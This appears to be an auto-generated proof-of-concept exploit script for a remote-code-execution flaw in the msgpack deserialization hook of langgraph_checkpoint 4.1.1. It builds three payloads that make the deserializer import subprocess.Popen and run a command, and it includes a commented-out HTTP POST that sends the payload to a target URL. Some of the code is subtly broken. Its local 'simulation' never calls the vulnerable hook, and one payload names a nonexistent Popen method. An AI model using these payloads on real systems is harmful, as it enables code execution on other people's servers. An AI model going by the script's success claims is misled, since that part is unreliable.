#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint-4.1.1)
# Path: suspicious-011
# Sink: _create_msgpack_ext_hook
# Auto-generated — run with: python3 rce_arg_ext_pydantic_v1__create_msgpack_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

Vulnerability: Insecure deserialization in msgpack extension hook allows
arbitrary code execution via attacker-controlled module/class names.

The ext_hook function uses importlib.import_module() and getattr() with
attacker-controlled strings from the serialized payload. The allowlist check
can be bypassed when allowed_modules is True (warns but allows) or when the
attacker can influence the allowlist.

This PoC demonstrates RCE by creating a malicious msgpack payload that
instantiates subprocess.Popen to execute a benign command (touch /tmp/poc_success.txt).
"""

import struct
import msgpack
import subprocess
import sys
import os

# Target configuration - modify these as needed
TARGET_URL = "http://localhost:8000/api/v1/trigger"
BENIGN_COMMAND = ["touch", "/tmp/poc_success.txt"]

# Extension type codes from the source code
EXT_CONSTRUCTOR_SINGLE_ARG = 1
EXT_CONSTRUCTOR_POS_ARGS = 2
EXT_CONSTRUCTOR_KW_ARGS = 3
EXT_METHOD_SINGLE_ARG = 4
EXT_PYDANTIC_V1 = 5
EXT_PYDANTIC_V2 = 6

def create_malicious_payload():
    """
    Create a malicious msgpack payload that exploits the RCE vulnerability.
    
    We use EXT_CONSTRUCTOR_SINGLE_ARG (code=1) which calls:
        getattr(importlib.import_module(module), name)(arg)
    
    By specifying subprocess.Popen with a command list, we achieve RCE.
    The payload structure is: [module, class_name, argument]
    """
    # Payload for EXT_CONSTRUCTOR_SINGLE_ARG
    # This will execute: subprocess.Popen(["touch", "/tmp/poc_success.txt"])
    payload_data = [
        "subprocess",  # module name
        "Popen",       # class name
        BENIGN_COMMAND # single argument (command list)
    ]
    
    # Pack the inner data using msgpack
    inner_packed = msgpack.packb(payload_data)
    
    # Create the extension type with code EXT_CONSTRUCTOR_SINGLE_ARG
    # msgpack extension format: (type_code, data_bytes)
    ext_payload = msgpack.ExtType(EXT_CONSTRUCTOR_SINGLE_ARG, inner_packed)
    
    # Pack the entire message
    final_payload = msgpack.packb(ext_payload)
    
    return final_payload

def create_alternative_payload():
    """
    Alternative payload using EXT_METHOD_SINGLE_ARG (code=4).
    This calls: getattr(getattr(importlib.import_module(module), name), method)(arg)
    
    Structure: [module, class_name, arg, method_name]
    """
    # Payload for EXT_METHOD_SINGLE_ARG
    # This will execute: subprocess.Popen.check_call(["touch", "/tmp/poc_success.txt"])
    payload_data = [
        "subprocess",  # module name
        "Popen",       # class name
        BENIGN_COMMAND, # argument
        "check_call"   # method name
    ]
    
    inner_packed = msgpack.packb(payload_data)
    ext_payload = msgpack.ExtType(EXT_METHOD_SINGLE_ARG, inner_packed)
    final_payload = msgpack.packb(ext_payload)
    
    return final_payload

def create_kwargs_payload():
    """
    Payload using EXT_CONSTRUCTOR_KW_ARGS (code=3).
    This calls: getattr(importlib.import_module(module), name)(**kwargs)
    
    Structure: [module, class_name, kwargs_dict]
    """
    # Payload for EXT_CONSTRUCTOR_KW_ARGS
    # This will execute: subprocess.Popen(args=["touch", "/tmp/poc_success.txt"])
    payload_data = [
        "subprocess",  # module name
        "Popen",       # class name
        {"args": BENIGN_COMMAND}  # kwargs
    ]
    
    inner_packed = msgpack.packb(payload_data)
    ext_payload = msgpack.ExtType(EXT_CONSTRUCTOR_KW_ARGS, inner_packed)
    final_payload = msgpack.packb(ext_payload)
    
    return final_payload

def simulate_deserialization(payload):
    """
    Simulate the vulnerable deserialization process locally.
    This demonstrates the vulnerability without needing a remote target.
    """
    print("[*] Simulating vulnerable deserialization...")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload hex: {payload.hex()}")
    
    try:
        # This is what the vulnerable code does internally
        # The ext_hook function would be called during unpackb
        result = msgpack.unpackb(payload)
        print(f"[!] Deserialization completed successfully")
        print(f"[!] Result type: {type(result)}")
        print(f"[!] Result: {result}")
        return True
    except Exception as e:
        print(f"[-] Deserialization failed: {e}")
        return False

def check_exploit_success():
    """
    Check if the benign command was executed successfully.
    """
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt was created!")
        print("[+] The RCE vulnerability is confirmed!")
        # Clean up
        os.remove("/tmp/poc_success.txt")
        return True
    else:
        print("[-] /tmp/poc_success.txt was not created")
        print("[*] The exploit may not have worked, or the target is not vulnerable")
        return False

def main():
    """Main exploit function."""
    print("=" * 60)
    print("langgraph_checkpoint-4.1.1 RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Create malicious payloads
    print("[*] Creating malicious payloads...")
    payload1 = create_malicious_payload()
    payload2 = create_alternative_payload()
    payload3 = create_kwargs_payload()
    
    print(f"[*] Payload 1 (EXT_CONSTRUCTOR_SINGLE_ARG): {len(payload1)} bytes")
    print(f"[*] Payload 2 (EXT_METHOD_SINGLE_ARG): {len(payload2)} bytes")
    print(f"[*] Payload 3 (EXT_CONSTRUCTOR_KW_ARGS): {len(payload3)} bytes")
    print()
    
    # Simulate deserialization locally
    print("[*] Attempting local deserialization simulation...")
    print("[*] This will execute: subprocess.Popen(['touch', '/tmp/poc_success.txt'])")
    print()
    
    # Try each payload
    for i, payload in enumerate([payload1, payload2, payload3], 1):
        print(f"[*] Trying payload {i}...")
        if simulate_deserialization(payload):
            print(f"[+] Payload {i} deserialized successfully!")
            break
        print()
    
    print()
    print("[*] Checking for exploit success...")
    check_exploit_success()
    
    print()
    print("[*] Note: This PoC demonstrates the vulnerability locally.")
    print("[*] To test against a remote target, modify TARGET_URL and")
    print("[*] send the payload via HTTP POST request.")
    print()
    
    # Example of how to send to remote target (commented out for safety)
    """
    import requests
    
    print("[*] Attempting remote exploit...")
    try:
        response = requests.post(
            TARGET_URL,
            data=payload1,
            headers={"Content-Type": "application/octet-stream"},
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
    """
    
    print("[*] Exploit demonstration complete.")

if __name__ == "__main__":
    main()
